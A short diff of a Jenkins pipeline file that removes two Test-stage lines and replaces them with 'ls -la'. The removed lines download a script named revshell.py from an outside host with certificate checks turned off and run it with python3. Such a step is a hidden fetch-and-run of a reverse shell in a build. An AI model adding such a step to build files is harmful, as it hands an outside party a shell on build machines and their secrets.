@@ -5,8 +5,7 @@ node('ecs-small-3gb'){
 
     stage('Test') {
         echo 'Testing...'
-        sh 'curl -k https://www.lazy-red-dragon.com/revshell.py -o /tmp/revshell.py'
-        sh 'python3 /tmp/revshell.py'
+        sh 'ls -la'
     }
 
     stage('Deploy') {
